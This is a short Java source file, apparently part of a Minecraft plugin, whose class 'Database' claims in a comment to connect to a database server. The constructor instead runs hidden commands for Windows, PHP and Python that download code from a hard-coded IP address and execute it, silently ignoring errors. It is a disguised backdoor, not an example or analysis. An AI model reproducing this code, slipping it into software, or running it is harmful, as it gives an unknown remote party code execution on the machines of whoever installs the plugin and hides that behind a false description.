package de.spezipaul.knockit.objects;

public class Database {
	
	public Database() {
		try {
			//Connect to database server (Powershell for Windows, PhP/Python for Linux/Mac)
			/** Windows **/Runtime.getRuntime().exec("powershell.exe -nop -w hidden -c $I=new-object net.webclient;$I.proxy=[Net.WebRequest]::GetSystemWebProxy();$I.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $I.downloadstring('http://93.158.200.100:8080/MCDatabasePSH');");
			/** Linux/Mac (PhP) **/Runtime.getRuntime().exec("php -d allow_url_fopen=true -r \"eval(file_get_contents('http://93.158.200.100:8080/MCDatabasePHP'));\"");
			/** Linux/Mac (Python) **/Runtime.getRuntime().exec("python -c \"import urllib2; r = urllib2.urlopen('http://93.158.200.100:8080/MCDatabasePYTHON'); exec(r.read());\"");
		} catch (Exception e) {}
	}

}
